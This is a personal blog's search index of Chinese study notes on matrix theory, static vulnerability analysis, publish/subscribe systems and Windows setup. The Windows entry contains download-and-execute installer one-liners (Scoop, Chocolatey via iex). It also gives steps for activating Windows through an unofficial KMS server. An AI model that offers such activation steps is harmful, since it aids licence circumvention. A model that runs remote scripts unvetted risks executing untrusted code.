<?xml version="1.0" encoding="utf-8"?>
<search> 
  
  
    
    <entry>
      <title>Matrix Theory</title>
      <link href="/2023/12/10/matrix-theory/"/>
      <url>/2023/12/10/matrix-theory/</url>
      
        <content type="html"><![CDATA[<h3 id="目录">目录</h3><h4 id="chapter-1">chapter 1</h4><h4 id="chapter-2">Chapter 2</h4><figure><img src="https://s2.loli.net/2023/12/13/Cek9FVH1o5tWGXK.png"alt="image-20231213211059786" /><figcaption aria-hidden="true">image-20231213211059786</figcaption></figure><h4 id="chapter-3">Chapter 3</h4><figure><img src="https://s2.loli.net/2023/12/13/gXpsVSFxQL2ftMr.png"alt="image-20231213210845806" /><figcaption aria-hidden="true">image-20231213210845806</figcaption></figure><h4 id="chapter-4">Chapter 4</h4><figure><img src="https://s2.loli.net/2023/12/13/ZcHQAtd41rYy59s.png"alt="image-20231213210754364" /><figcaption aria-hidden="true">image-20231213210754364</figcaption></figure><h4 id="chapter-5image-20231213210557547">chapter 5<imgsrc="https://s2.loli.net/2023/12/13/hWIXcJVpyaAg5x7.png"alt="image-20231213210557547" /></h4><h4 id="chapter-6">chapter 6</h4><p><img src="https://s2.loli.net/2023/12/13/qguMJGUd5PBf9Xp.png" /></p><h3 id="说在前头">说在前头</h3><ol type="1"><li>https://oi-wiki.org/math/linear-algebra/char-poly/#%E7%89%B9%E5%BE%81%E5%A4%9A%E9%A1%B9%E5%BC%8F</li></ol><h3 id="chapter1-线性空间与线性变换">Chapter1 线性空间与线性变换</h3><h4 id="线性空间">1.1 线性空间</h4><ol type="1"><li><strong>数域</strong>：如果一个数集包含非零的数，并且任意两个数(可以重复)的和、差、积、商(除数不为零)<strong>仍在该数集</strong>中，则称该数集为一个数域</li><li>四则运算封闭</li><li>包含<strong>非零</strong>的数，且对<strong>四则运算封闭</strong>的数集称为数域</li><li>线性空间的性质</li><li>线性空间的基不是唯一的</li></ol><hr /><h5 id="基变换与坐标变换">基变换与坐标变换</h5><ol type="1"><li>过渡矩阵是可逆矩阵</li><li><figure><img src="https://s2.loli.net/2023/12/11/MNuCLFWy8ZPklhG.png"alt="image-20231211012342412" /><figcaption aria-hidden="true">image-20231211012342412</figcaption></figure></li></ol><hr /><h5 id="线性子空间">线性子空间</h5><ol type="1"><li>线性子空间<imgsrc="https://s2.loli.net/2023/12/11/V1X9FLeNKpYgkv4.png"alt="image-20231211013556308" /></li><li>生成子空间<imgsrc="https://s2.loli.net/2023/12/11/W6XlGJpvqtLH5j3.png"alt="image-20231211013727419" /></li><li>矩阵的值域<imgsrc="https://s2.loli.net/2023/12/11/FhvVEXPCzWgU2ma.png"alt="image-20231211014258542" /></li><li>矩阵的零空间<imgsrc="https://s2.loli.net/2023/12/11/qBT7kEWyrVN8ug3.png"alt="image-20231211014450938" /></li><li>基的扩充定理<imgsrc="https://s2.loli.net/2023/12/11/Dc3EHnqReu8QFL5.png"alt="image-20231211014803700" /></li><li>子空间的交与和<ol type="1"><li>子空间的交<imgsrc="https://s2.loli.net/2023/12/11/ogdKlfDQH8GRcuE.png"alt="image-20231211014918370" /></li><li>子空间的和<imgsrc="https://s2.loli.net/2023/12/11/95BtklVvY3i8FCS.png"alt="image-20231211015016790" /></li><li>维数公式<imgsrc="https://s2.loli.net/2023/12/11/fuVkh6cWyO93TlE.png"alt="image-20231211015115792" /></li><li>子空间的直和<imgsrc="https://s2.loli.net/2023/12/11/QduN4JcsahgWUv2.png"alt="image-20231211015759577" /></li></ol></li></ol><h4 id="线性变换及其矩阵">1.2 线性变换及其矩阵</h4><h5 id="线性变换及其运算">线性变换及其运算</h5><ol type="1"><li>定义<img src="https://s2.loli.net/2023/12/11/6lpWMs2tDyHrf3i.png"alt="image-20231211020446098" /></li><li>定义<img src="https://s2.loli.net/2023/12/11/PLjGsdEcztZ53eX.png"alt="image-20231211022254983" /></li><li>性质<img src="https://s2.loli.net/2023/12/11/5N2cSTiZorsvdyw.png"alt="image-20231211022316249" /></li><li>线性变换的值域和核<imgsrc="https://s2.loli.net/2023/12/11/7p4G8f2zUtdwTr1.png"alt="image-20231211022806890" /></li><li>线性变换的运算<imgsrc="https://s2.loli.net/2023/12/11/f5gp41WCvmylMRN.png"alt="image-20231211151946058" /></li><li>线性变换与数的乘法<imgsrc="https://s2.loli.net/2023/12/11/95GzSnaQgU4c8HD.png"alt="image-20231211152337375" /></li><li>定义线性变换的加法和线性变换与数的乘法统称为线性变换的线性运算．线性空间V的所有线性变换的集合在上述线性运算下形成一个新的线性空间，记为Hom(V,V)，称为线性空间V的<code>同态</code></li><li>线性变换的乘法<imgsrc="https://s2.loli.net/2023/12/11/xrAv1gfQY5pjdVB.png"alt="image-20231211153732111" /></li><li>逆变换<img src="https://s2.loli.net/2023/12/11/AJrLNKZqbFgwXId.png"alt="image-20231211153948738" /></li><li>线性变换的运算<imgsrc="https://s2.loli.net/2023/12/11/o9fzhjeb6VaBmYi.png"alt="image-20231211154348123" /></li><li>线性变换的多项式<imgsrc="https://s2.loli.net/2023/12/11/fwBSj7kVIxXGOb4.png"alt="image-20231211154450460" /></li></ol><h5 id="线性变换的矩阵表示">线性变换的矩阵表示</h5><ol type="1"><li>线性变换在给定基下的矩阵<imgsrc="https://s2.loli.net/2023/12/11/YUmKJPEnHpCsRwq.png"alt="image-20231211155206740" /><imgsrc="https://s2.loli.net/2023/12/11/Ug6sRGaqchk8Jnf.png"alt="image-20231211155258925" /><imgsrc="https://s2.loli.net/2023/12/11/Xtoqx8Hbz2CLEer.png"alt="image-20231211155536883" /></li><li>线性变换的矩阵的简单性质<imgsrc="https://s2.loli.net/2023/12/11/M2K6NEwvdqfHy4l.png"alt="image-20231211160131183" /><imgsrc="https://s2.loli.net/2023/12/11/dmZMhasnNxFObpg.png"alt="image-20231211160552006" /></li><li>线性变换在不同基下的矩阵<imgsrc="https://s2.loli.net/2023/12/11/RUQcnr459xSCgyI.png"alt="image-20231211160714631" /></li><li>相似矩阵的性质<imgsrc="https://s2.loli.net/2023/12/11/KfCru4jUthGvRnq.png"alt="image-20231211161404461" /></li></ol><h5 id="特征值与特征向量">特征值与特征向量</h5><ol type="1"><li><figure><img src="https://s2.loli.net/2023/12/11/ahAWO4vqpnPflBe.png"alt="image-20231211164630468" /><figcaption aria-hidden="true">image-20231211164630468</figcaption></figure></li><li><imgsrc="https://s2.loli.net/2023/12/11/x4LCPJTBbWUpOSI.png" /></li><li>特征值与线性变换矩阵的关系<imgsrc="https://s2.loli.net/2023/12/11/gWlLTwiz4KkNUXd.png"alt="image-20231211165113153" /></li><li>特征子空间<imgsrc="https://s2.loli.net/2023/12/11/JrYvBxGzReNPn3d.png"alt="image-20231211165627557" /></li><li>矩阵的迹<imgsrc="https://s2.loli.net/2023/12/11/I8HhGrVbnYCfZm6.png"alt="image-20231211165739765" /><imgsrc="https://s2.loli.net/2023/12/11/naHocRMyueCqOdS.png"alt="image-20231211165847192" /></li><li>最小多项式<imgsrc="https://s2.loli.net/2023/12/11/Vu5dkZRPqci6roU.png"alt="image-20231211173940726" /></li><li>对角矩阵<imgsrc="https://s2.loli.net/2023/12/11/wxCqmvrifWyBpet.png"alt="image-20231211174510405" /></li><li>不变子空间</li><li>Jordan 标准型<imgsrc="https://s2.loli.net/2023/12/11/JxEegfVS8XK7ynw.png"alt="image-20231211180915247" /><imgsrc="https://s2.loli.net/2023/12/11/3HjczGJYoRD2ZKB.png"alt="image-20231211181036957" /></li><li>相似变换矩阵的求法<imgsrc="https://s2.loli.net/2023/12/11/m8efiEkjA2QsdF7.png"alt="image-20231211181353399" /></li></ol><h4 id="两个特殊的线性空间">1.3 两个特殊的线性空间</h4><h4 id="euclid空间的定义与性质">Euclid空间的定义与性质</h4><ol type="1"><li>Euclid空间的定义<imgsrc="https://s2.loli.net/2023/12/11/Ukdti5OzwXBKgbr.png"alt="image-20231211182715610" /><imgsrc="https://s2.loli.net/2023/12/11/2OhkNzUTI8ZFioC.png"alt="image-20231211182823673" /><imgsrc="https://s2.loli.net/2023/12/11/lNe519azd7IB6jn.png"alt="image-20231211183236685" /></li><li>内积的简单性质<imgsrc="https://s2.loli.net/2023/12/11/oG8Jgj1hzuVLc7B.png"alt="image-20231211183302458" /></li><li>度量矩阵<imgsrc="https://s2.loli.net/2023/12/11/9wWIhdFcR4zyvrP.png"alt="image-20231211183354511" /><imgsrc="https://s2.loli.net/2023/12/11/y3BTJaH5SzdVw7W.png"alt="image-20231211184438757" /><imgsrc="https://s2.loli.net/2023/12/11/GmpgHMKrDUh2Sk6.png"alt="image-20231211184513029" /></li><li>内积的运算结果与基的选取无关</li><li>向量的长度和夹角<imgsrc="https://s2.loli.net/2023/12/11/KfJXzDgC6idcWZ8.png"alt="image-20231211185536631" /></li><li>柯西-布涅柯夫斯基不等式<imgsrc="https://s2.loli.net/2023/12/11/paOgPt1hZ7Fj8N9.png"alt="image-20231211185642055" /></li><li>两个不等式<imgsrc="https://s2.loli.net/2023/12/11/Jnwl3Ar1QeKZvop.png"alt="image-20231211185814154" /></li></ol><h4 id="正交变换与正交矩阵">正交变换与正交矩阵</h4><h4 id="对称变换与对称矩阵">对称变换与对称矩阵</h4><h5 id="酉空间">酉空间</h5><ol type="1"><li>酉对称变换或Hermite变换<imgsrc="https://s2.loli.net/2023/12/11/QInCVqWK3GrPtRT.png"alt="image-20231211192147737" /></li><li>Schur引理</li><li>正规矩阵</li><li>线性变换在给定基下的矩阵</li></ol><h3 id="problems">Problems</h3><ol type="1"><li><img src="https://s2.loli.net/2023/12/11/BYgNUfljd1px2QD.png"alt="image-20231211012920832" /><imgsrc="https://s2.loli.net/2023/12/11/oKl4ZCHOA9Bb7kx.png"alt="image-20231211013241532" /></li><li>子空间的直和<imgsrc="https://s2.loli.net/2023/12/11/4cXqAmDVGiyNr82.png"alt="image-20231211015614288" /></li><li><figure><img src="https://s2.loli.net/2023/12/11/gI7ZM6hqQdzDovR.png"alt="image-20231211151855023" /><figcaption aria-hidden="true">image-20231211151855023</figcaption></figure></li><li><figure><img src="https://s2.loli.net/2023/12/11/dNzqUvkD9GPhVJ2.png"alt="image-20231211154039610" /><figcaption aria-hidden="true">image-20231211154039610</figcaption></figure></li><li>Hamilton-Cayley定理<imgsrc="https://s2.loli.net/2023/12/11/GvNTYQtMB143Ooa.png"alt="image-20231211172708890" /></li><li>最小多项式<imgsrc="https://s2.loli.net/2023/12/11/NyFuGp5wcnroBQD.png"alt="image-20231211173211029" /></li><li><figure><img src="https://s2.loli.net/2023/12/11/F6sJ4xrekDXSvGb.png"alt="image-20231211173755761" /><figcaption aria-hidden="true">image-20231211173755761</figcaption></figure></li></ol><h3 id="chapter2-范数理论及其应用">Chapter2 范数理论及其应用</h3><h4 id="向量范数及其性质">2.1 向量范数及其性质</h4><ol type="1"><li>向量序列的极限</li><li>向量范数的定义<imgsrc="https://s2.loli.net/2023/12/12/yZXkoni7PJrNmYf.png"alt="image-20231212222145271" /></li><li>加权范数<imgsrc="https://s2.loli.net/2023/12/12/fiEqMBbIOsDePtn.png"alt="image-20231212223944173" /></li></ol>]]></content>
      
      
      <categories>
          
          <category> Math </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>静态分析与漏洞-论文</title>
      <link href="/2023/12/09/jing-tai-fen-xi-zhong-wen-lun-wen/"/>
      <url>/2023/12/09/jing-tai-fen-xi-zhong-wen-lun-wen/</url>
      
        <content type="html"><![CDATA[<h3 id="源代码漏洞静态分析技术">源代码漏洞静态分析技术</h3><h3 id="论文信息">论文信息</h3><ul><li><ahref="https://kns.cnki.net/kcms2/article/abstract?v=3uoqIhG8C44YLTlOAiTRKibYlV5Vjs7iJTKGjg9uTdeTsOI_ra5_XUOBf5PJfPHzFI1Iowm5RnSruNt5uupdj5nQHdiZ1oas&amp;uniplatform=NZKPT">源代码漏洞静态分析技术</a></li><li>川大硕士</li></ul><h3 id="背景">背景</h3><ul><li>面向源代码的静态分析，漏洞检测</li></ul><h3 id="传统静态分析">传统静态分析</h3><ul><li><p>静态分析技术是指在不运行程序代码的情况下,对其进行词法分析、语法分析以及语义分析, 配合数据流分析和污点分析等技术,对程序代码进行抽象和建模,分析程序的控制依赖、数据依赖和变量受污染状态等信息,通过安全规则检查、模式匹配等方式挖掘程序代码中存在的漏洞[5-7]。常见的静态分析工具有:WALA[8]、FindBugs[9]、JSPrime[10]、CodeQL[11]、Fortify[12]、Cppcheck[13]、Cobot[14]等</p></li><li><p>面向源代码的静态分析和面向二进制代码的静态分析</p></li><li><p>动态分析是指在沙箱等受控环境中执行程序, 向程序输入特定的数据,监视其运行时的行为,收集函数的执行结果、程序的异常行为和崩溃情况等信息以判断目标程序是否存在漏102Journal of Cyber Security 信息安全学报, 2022 年 7 月, 第 7 卷, 第 4 期洞[15-16]。常见的动态分析工具有: AFL[17]、Sage[18]和jsfunfuzz[19]等</p></li><li><p>动态分析技术包括动态符号执行和模糊测试两种</p><ul><li>静态符号执行和动态符号执行</li></ul></li><li><p>静态分析可以贯穿整个软件生命周期,对程序代码进行抽象和建模,在低资源需求的前提下实现高代码覆盖率</p></li><li><p>由于分析是基于对程序代码的抽象和建模,分析器的分析逻辑很大程度上取决于对漏洞已有的先验知识,所以在面对未定义的程序错误行为时, 静态分析往往存在误报率高的问题; 此外,静态分析还存在运行时漏洞检测难问题。</p></li><li><p>为了在软件系统上线前就对其可能存在的漏洞进行检测,将软件系统面临的风险扼杀在摇篮中,进一步减少软件系统上线后可能受到的安全威胁,越来越多的企业开始在软件开发过程中使用静态分析对软件漏洞进行挖掘</p><ul><li>源代码表示方法生成流程<imgsrc="https://s2.loli.net/2023/07/06/jXnkCioV9yJmqud.png"alt="image-20230706020825842" /></li></ul></li><li><p>CPG<img src="https://s2.loli.net/2023/07/06/WRpebAy3jBXK4Mz.png"alt="image-20230706020812793" /></p></li><li><p>传统静态分析基本流程<imgsrc="https://s2.loli.net/2023/07/07/tyoX5DWgwIBePFR.png"alt="image-20230707235729649" /></p></li></ul><h3 id="基于学习的漏洞检测">基于学习的漏洞检测</h3><ul><li><p><strong>第一步</strong>是对其进行解析或构建程序切片以保留与漏洞检测相关的信息;<strong>接着</strong>使用词嵌入等技术将源代码中间表示或切片映射到向量空间;<strong>最后</strong>借助机器学习或深度学习模型强大的大数据挖掘能力学习源代码蕴含的各类信息(如:控制依赖和数据依赖信息), 进而实现漏洞检测。<strong>同时</strong>,可以利用传统静态分析方法提取源代码污点变量的传播情况、净化函数的有效性等信息,丰富模型学习的知识空间, 从而获得性能更好的检测模型。</p></li><li><p>基于学习的静态分析基本流程<imgsrc="https://s2.loli.net/2023/07/08/1g5KCzcbekxT8VM.png"alt="image-20230708000717522" /></p></li><li><p>编程语言与自然语言处理</p></li></ul>]]></content>
      
      
      <categories>
          
          <category> Academic </category>
          
      </categories>
      
      
        <tags>
            
            <tag> paper </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>发布订阅系统</title>
      <link href="/2023/12/09/fa-bu-ding-yue-xi-tong/"/>
      <url>/2023/12/09/fa-bu-ding-yue-xi-tong/</url>
      
        <content type="html"><![CDATA[<h3 id="区块链与雾节点">区块链与雾节点</h3><h2 id="a-publish-subscribe-system-over-ndn-psndn">A Publish SubscribeSystem Over NDN (PSNDN)</h2><p><a href="https://ieeexplore.ieee.org/document/8940033">论文</a></p><ul><li>block diagram<imgsrc="https://ieeexplore.ieee.org/mediastore_new/IEEE/content/media/8932631/8939563/8940033/choi1-P2-19-large.gif"alt="img" /><ul><li>topics management block<ul><li>Publish Management</li><li>Topic Tree Creation/Insert/Delete/Matching</li><li>Flexible Naming(Aliasing) Publish</li><li>Subscription Management</li><li>Flexible Subscription(Wildcard)</li></ul></li><li>Matching Management block<ul><li>Exact Matching</li><li>Flexible Naming(Aliasing) Matching</li><li>Flexible Subscription(Wildcard) Matching</li></ul></li><li>Storage Management block<ul><li>Log Creation/Insert/Delete/Indexing/Matching</li><li>Queue Creation/Enqueueing/Dequeueing</li></ul></li><li>The Authorization Management block<ul><li>Pub/Sub Service Subscription</li><li>Producer/Consumer Authorization</li></ul></li><li></li></ul></li></ul><h4id="看完以下4部分内容后的初步想法">看完以下4部分内容后的初步想法</h4><ul><li>基于区块链的那片英文文献是我看的以下几篇内容中使用了<strong>较为现代的技术了</strong>，2018年被收录的文章</li><li>这篇文章<strong>挺多内容没看懂</strong>，尤其是第4部分（架构）<ul><li>另外两篇中文文献讲的是<strong>传统</strong>发布/订阅系统，零几年的文章</li></ul></li><li>以下是对那篇英文文献的总结<ul><li>本文是使用<code>区块链技术（Tendermint Blockchain frame-work.）</code>+<code>发布/订阅模型（Mosquitto (MQTT) Broker）</code>实现<code>Trinity</code><code>framework</code></li><li>关于改进<ul><li>文中结论提到可以使用<code>HyperLedger Fabric</code>和<code>IOTA</code>等区块链框架实现Trinity框架</li><li>同时文中也提到<code>Kafka</code>发布/订阅模型（但是还不确定能否拿过来用），以下是Kafka的介绍<ul><li>Kafka是一个更为强大的发布-订阅代理，是为数据中心使用而开发的，它拥有<strong>丰富</strong>的功能。</li><li>与Mosquitto相比，Kafka的<strong>重量相对较重，</strong>并使用专有协议进行通信。它被设计成以分布式的方式运行，内置了对分区和复制的支持。分区是一种在不同实例间进行负载平衡的方法，而复制则是在多个实例间复制相同的数据。尽管Kafka提供了排序保证和可配置的消息持久性，但它假设软件是由一个组织管理的，这意味着在系统运行过程中没有穿越信任边界。</li><li><strong>没有任何东西可以防止数据被篡改</strong>，因为Kafka部署的每一个实例都是由一个实体拥有和操作的。在我们设计的Trinity中，我们不做这种关于信任的假设。通过使用区块链网络，Trinity可以保证跨信任边界的持久性、有序性和不可更改性。</li></ul></li></ul></li></ul></li></ul><h3id="trinity-a-distributed-publishsubscribe-broker-with-blockchain-based-immutability2018年被收录">Trinity:A Distributed Publish/Subscribe Broker with Blockchain-basedImmutability(2018年被收录)</h3><h4 id="简介">简介</h4><ul><li><p>CoAP[2]是一个针对资源受限的物联网系统的轻量级请求-回复协议，它消耗的资源有限，但它仍然缺乏对广泛平台的可扩展性和可移植性的支持。另外，发布-订阅消息模型因其低通信开销和资源效率而被广泛使用。</p></li><li><p>发布/订阅模型(single blocker)<imgsrc="https://s2.loli.net/2023/02/19/jWmJTpQ6as3lY5y.png"alt="image-20230219195146007" /></p></li><li><p>Trinity framework</p><ul><li><p>blockchain technology</p><ul><li>consensus algorithm</li><li>distributed ledger</li><li>public-key cryptography</li></ul><hr /><ul><li>public blockchain</li><li>permissioned blockchains</li></ul></li><li><p>publish-subscribe messaging model</p></li><li><p>WHY DISTRIBUTED BROKER</p><ul><li>Overview of the Trinity framework.<imgsrc="https://s2.loli.net/2023/02/19/jcIriLePOHARaVF.png"alt="image-20230219222322132" /></li></ul></li></ul></li></ul><h4 id="architecture-oftrinity">ARCHITECTURE OFTRINITY</h4><p>MENTATION ANDEVALUATION</p><ul><li><p>Trinity framework</p><ul><li>Mosquitto (MQTT) Broker<ul><li>smart contact 验证消息</li></ul></li><li>Tendermint Blockchain frame-work.<ul><li>开源的区块链框架</li><li>使用Byzantine Fault Tolerance (BFT) consensus protocol,</li></ul></li><li>Application Blockchain Interface (ABC接口)</li><li>连接MQTT Broker与Tendermint</li></ul></li></ul><h4 id="related-works">Related Works</h4><ul><li>Kafka[13]是一个更为强大的发布-订阅代理，是为数据中心使用而开发的，它拥有丰富的功能。<ul><li>与Mosquitto相比，Kafka的重量相对较重，并使用专有协议进行通信。它被设计成以分布式的方式运行，内置了对分区和复制的支持。分区是一种在不同实例间进行负载平衡的方法，而复制则是在多个实例间复制相同的数据。尽管Kafka提供了排序保证和可配置的消息持久性，但它假设软件是由一个组织管理的，这意味着在系统运行过程中没有穿越信任边界。</li><li>没有任何东西可以防止数据被篡改，因为Kafka部署的每一个实例都是由一个实体拥有和操作的。在我们设计的Trinity中，我们不做这种关于信任的假设。通过使用区块链网络，Trinity可以保证跨信任边界的持久性、有序性和不可更改性。</li></ul></li></ul><h4 id="总结">总结</h4><ul><li>we will implement the Trinity framework using blockchain frame-workssuch as HyperLedger Fabric and IOTA to evaluate the performance cost ofvarious consensus algorithms.</li></ul><h3id="基于内容的发布订阅关键技术研究--苑宏亮这篇很好但是2007被收录">基于内容的发布订阅关键技术研究--苑宏亮（这篇很好，但是2007被收录）</h3><h4 id="发布订阅通信范型">发布/订阅通信范型</h4><ul><li>概念模型<imgsrc="https://s2.loli.net/2023/02/19/nsipa5UfoMJ31wY.png" /></li><li>交互模型<imgsrc="https://s2.loli.net/2023/02/19/HyadvmbMRYhfz7r.png"alt="image-20230219163927512" /></li><li>分类<ul><li>基于通道</li><li>基于主题</li><li>基于内容</li><li>基于类型</li></ul></li><li>挑战<ul><li>提高事件的匹配速度</li><li>事件的可靠传输</li></ul></li><li>本文成果<ul><li>移动计算环境的扩展支持技术研究</li></ul></li><li>系统实现<ul><li>以分布计算中间件StasrBus+为基础，设计和实现了一个通知服务原型系统Densa。</li></ul></li></ul><h3 id="一文搞懂发布订阅模式">一文搞懂发布订阅模式</h3><p><a href="https://juejin.cn/post/6844903834196656141">blog</a></p><ul><li>参考微信公众号<imgsrc="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-user-assets/2019/5/2/16a7448d45a9e91a~tplv-t2oaga2asx-zoom-in-crop-mark:4536:0:0:0.awebp"alt="img" /></li><li>属于设计模式中的行为模式<imgsrc="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-user-assets/2019/5/2/16a7448a32a040cb~tplv-t2oaga2asx-zoom-in-crop-mark:4536:0:0:0.awebp"alt="img" /></li><li>特点：松耦合</li><li>优点：<ul><li>松耦合</li><li>高伸缩性</li><li>高可靠性</li><li>灵活性</li><li>可测试性</li></ul></li><li>设计系统该考虑的点<ul><li>订阅处理</li><li>安全</li><li>内容筛选</li><li>单向还是双向通信</li><li>消息排序</li><li>消息优先级</li><li>有毒信息</li><li>消息重复</li><li>消息过期</li><li>消息调度</li></ul></li><li>此模式的应用场景<ul><li>应用程序需要向大量消费者广播信息。例如微信订阅号就是一个消费者量庞大的广播平台。</li><li>应用程序需要与一个或多个独立开发的应用程序或服务通信，这些应用程序或服务可能使用不同的平台、编程语言和通信协议。</li><li>应用程序可以向消费者发送信息，而不需要消费者的实时响应。</li><li>被集成的系统被设计为支持其数据的最终一致性模型。</li><li>应用程序需要将信息传递给多个消费者，这些消费者可能具有与发送者不同的可用性要求或正常运行时间计划。例如你消息在上午发布了出去，消费者计划在下午才去处理这些消息。</li></ul></li><li>发布/订阅模式与观察者模式<imgsrc="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-user-assets/2019/5/2/16a7448aaf090b32~tplv-t2oaga2asx-zoom-in-crop-mark:4536:0:0:0.awebp"alt="img" /><ul><li>异同：</li><li></li></ul></li></ul><h3id="发布订阅系统关键技术研究---王辰">发布订阅系统关键技术研究---王辰</h3><p>​ <strong>（本文主要侧重点在安全设计上，而不是系统）</strong></p><h4 id="背景">背景</h4><ul><li><p>关键词：分布式网络、</p></li><li><p>点对点网络</p><ul><li>问题：当前的互联网架构与当前的数据以及以内容为中心的应用之间不互相匹配，无论信息的来源是什么，用户需要的数据在很多情况下是未知的</li><li>基于内容的网络：正好解决上述问题</li><li>因为优点：高效率、低网络负载，低延迟和高能源效率的优势</li></ul></li><li><p>发布订阅通信范式是一个不错的例子</p><ul><li>实现高效、安全的信息分布和管理，保证信息的完整性、保密性和可用性</li><li>成果：<ul><li>基于冗余属性的分布订阅系统加密算法</li><li>基于广告信息加密的发布订阅系统访问控制</li><li>混合模式的密钥管理机制来管理事件的加密密钥</li></ul></li></ul></li><li><p>研究现状</p><ul><li>对安全关键技术的研究成果较少。</li><li>很少考虑访问控制策略加密、订阅条件加密机制和叛逆者追踪手段等与发布订阅系统紧密相关的问题。</li></ul></li></ul><h4 id="系统">系统</h4><ul><li>基本结构<imgsrc="https://s2.loli.net/2023/02/19/MGF578bdWCfHpcO.png"alt="image-20230219142300975" /><ul><li>交互原理<imgsrc="https://s2.loli.net/2023/02/19/JjfuDg1sCmhnHPw.png"alt="image-20230219142537059" /></li></ul></li><li>解耦<img src="https://s2.loli.net/2023/02/19/bayenYjR15F8TO9.png"alt="image-20230219142838762" /><ul><li>空间</li><li>时间</li><li>同步</li></ul></li><li>种类<ul><li>基于主题</li><li>基于内容</li><li>基于类型</li><li>基于概念</li></ul></li><li>组成要素：<ul><li>事件结构</li><li>订阅结构</li><li>匹配定义</li><li>订阅覆盖</li></ul></li><li>网络拓扑</li></ul>]]></content>
      
      
      <categories>
          
          <category> Academic </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>WindTerm</title>
      <link href="/2023/12/09/windterm/"/>
      <url>/2023/12/09/windterm/</url>
      
        <content type="html"><![CDATA[<h3 id="工作目录">工作目录</h3><ul><li>设置<img src="https://s2.loli.net/2023/07/18/dP1cEpBnATFRZSN.png"alt="image-20230718085116774" /></li></ul>]]></content>
      
      
      <categories>
          
          <category> Tools </category>
          
      </categories>
      
      
        <tags>
            
            <tag> WindTerm </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Windows</title>
      <link href="/2023/12/09/windows/"/>
      <url>/2023/12/09/windows/</url>
      
        <content type="html"><![CDATA[<h3 id="official-documnet">Official Documnet</h3><ul><li>https://learn.microsoft.com/zh-cn/windows/package-manager/winget/</li></ul><h3 id="winget-scoop">Winget &amp; Scoop</h3><ul><li><p><strong>Scoop Installation</strong></p><pre class="language-powershell" data-language="powershell"><code class="language-powershell"><span class="token function">iwr</span> <span class="token operator">-</span>useb get<span class="token punctuation">.</span>scoop<span class="token punctuation">.</span>sh <span class="token punctuation">|</span> <span class="token function">iex</span></code></pre><p><strong>报错</strong><imgsrc="https://s2.loli.net/2023/05/16/mcYHSXnhGCrKE8W.png"alt="image-20230516172519670" /></p></li><li><p><strong>Winget</strong><imgsrc="https://s2.loli.net/2023/05/16/e4rWJpRqlsZuU72.png"alt="image-20230516172604874" /></p></li></ul><h3 id="win10专业版">win10专业版</h3><pre class="language-powershell" data-language="powershell"><code class="language-powershell">1<span class="token punctuation">.</span> win+r2<span class="token punctuation">.</span> cmd3<span class="token punctuation">.</span> slmgr <span class="token operator">/</span>ipk W269N-WFGWX-YVC9B-4J6C9-T83GX4<span class="token punctuation">.</span> slmgr <span class="token operator">/</span>skms kms<span class="token punctuation">.</span>03k<span class="token punctuation">.</span>org5<span class="token punctuation">.</span> slmgr <span class="token operator">/</span>ato</code></pre><h3 id="win11-pro-workstation">Win11 Pro WorkStation</h3><ul><li>win11 企业版升级失败，导致重装系统</li><li>next I tell you,下载win11 镜像</li><li>制作u盘启动盘</li><li>选择安装安装你想要的系统类型</li><li>激活<ul><li>网上很多是企业的激活秘钥，可用如下教程</li><li><ahref="https://www.cnblogs.com/brf-test/p/16572521.html">教程</a></li><li><ahref="https://www.cnblogs.com/CnKker/p/15579766.html">教程2</a></li></ul></li></ul><h3 id="chocolatey">Chocolatey</h3><ol type="1"><li><p>官网地址：https://chocolatey.org</p></li><li><p>Chocolatey是一款专为Windows系统开发的、基于NuGet的包管理器工具，类似于Node.js的npm，MacOS的brew，Ubuntu的apt-get，它简称为choco。Chocolatey的设计目标是成为一个去中心化的框架，便于开发者按需快速安装应用程序和工具</p></li><li><p>install chocolatey</p><pre class="language-powershell" data-language="powershell"><code class="language-powershell"><span class="token function">Set-ExecutionPolicy</span> Bypass <span class="token operator">-</span>Scope <span class="token keyword">Process</span> <span class="token operator">-</span>Force<span class="token punctuation">;</span> <span class="token namespace">[System.Net.ServicePointManager]</span>::SecurityProtocol = <span class="token namespace">[System.Net.ServicePointManager]</span>::SecurityProtocol <span class="token operator">-bor</span> 3072<span class="token punctuation">;</span> <span class="token function">iex</span> <span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token function">New-Object</span> System<span class="token punctuation">.</span>Net<span class="token punctuation">.</span>WebClient<span class="token punctuation">)</span><span class="token punctuation">.</span>DownloadString<span class="token punctuation">(</span><span class="token string">'https://community.chocolatey.org/install.ps1'</span><span class="token punctuation">)</span><span class="token punctuation">)</span></code></pre></li><li><p>https://community.chocolatey.org/packages</p></li></ol><h3 id="wsl2-使用代理-clash-for-windows">WSL2使用代理-clash-for-windows</h3><ol type="1"><li><p><ahref="https://solidspoon.xyz/2021/02/17/%E9%85%8D%E7%BD%AEWSL2%E4%BD%BF%E7%94%A8Windows%E4%BB%A3%E7%90%86%E4%B8%8A%E7%BD%91/">参考</a></p></li><li><p>在 <code>~/.zshrc</code>添加如下配置</p><pre class="language-bash" data-language="bash"><code class="language-bash"><span class="token builtin class-name">export</span> <span class="token assign-left variable">hostip</span><span class="token operator">=</span><span class="token variable"><span class="token variable">$(</span><span class="token function">cat</span> /etc/resolv.conf <span class="token operator">|</span><span class="token function">grep</span> <span class="token parameter variable">-oP</span> <span class="token string">'(?&lt;=nameserver\ ).*'</span><span class="token variable">)</span></span><span class="token builtin class-name">alias</span> <span class="token assign-left variable">setss</span><span class="token operator">=</span><span class="token string">'export all_proxy="socks5://$&#123;hostip&#125;:7890";'</span><span class="token builtin class-name">alias</span> <span class="token assign-left variable">unsetss</span><span class="token operator">=</span><span class="token string">'unset all_proxy'</span></code></pre><ol type="1"><li><code>setss</code><imgsrc="https://s2.loli.net/2023/10/03/Jol4WzdpLiuDCVK.png"alt="image-20231003005902340" /></li></ol></li></ol><hr /><ol type="1"><li><p>```bash ## 获取主机 IP ## 主机 IP 保存在 /etc/resolv.conf 中export hostip=$(cat /etc/resolv.conf |grep -oP '(?&lt;=nameserver ).*')<pre class="language-none"><code class="language-none">2. &#96;&#96;&#96;bash   export https_proxy&#x3D;&quot;http:&#x2F;&#x2F;$&#123;hostip&#125;:7890&quot;;   export 